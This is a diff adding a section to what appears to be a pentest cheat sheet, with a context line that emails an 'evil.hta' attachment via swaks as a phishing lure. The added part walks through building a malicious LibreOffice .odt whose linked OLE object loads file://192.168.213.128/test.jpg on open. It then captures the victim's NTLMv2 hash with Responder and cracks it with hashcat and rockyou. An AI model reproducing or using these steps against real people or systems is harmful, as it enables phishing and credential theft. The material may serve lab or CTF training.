@@ -122,3 +122,45 @@ Shell Command: choosing between Shell Str, 1 and Shell(Str) often depends on the
 ### 6) Deliver
 
     swaks --to target@example.com --from emmanuel@example.com \ --server smtp.example.com:587 --auth LOGIN \ --auth-user emmanuel@example.com --auth-password 'your_password' \ --attach evil.hta --header "Subject: Important Document" \ --body "Hi,\n\nPlease find the attached document.\n\nBest regards,\nEmmanuel"
+
+## Steal NTLMv2 Hash
+
+### 1) Create a malicious .odt file
+
+Open LibreOffice Writer
+
+Insert → Object → OLE Object → Create From File
+
+Check "create from file" and "Link to file".
+
+In file parameter, select any file and then click "OK".
+
+Save the file as "test1.odt" and exit libreoffice.
+
+### 2) View the source files of the .odt and edit the content.xml file
+
+Unzip contents
+
+    unzip test1.odt
+
+Edit content.xml
+
+    nano content.xml
+
+Replace the href value of the file you selected previously to file://IP/test.jpg in the tag that starts with <draw:object .
+
+    <draw:object xlink:href="file://192.168.213.128/test.jpg" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
+
+Zip back to .odt
+
+    zip -r document.odt *
+
+### 3) Run Responder
+
+    sudo responder -I tun0
+
+### 4) Send/upload the malicious .odt file to capture the hash
+
+### 5) Crack hash
+
+    hashcat -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
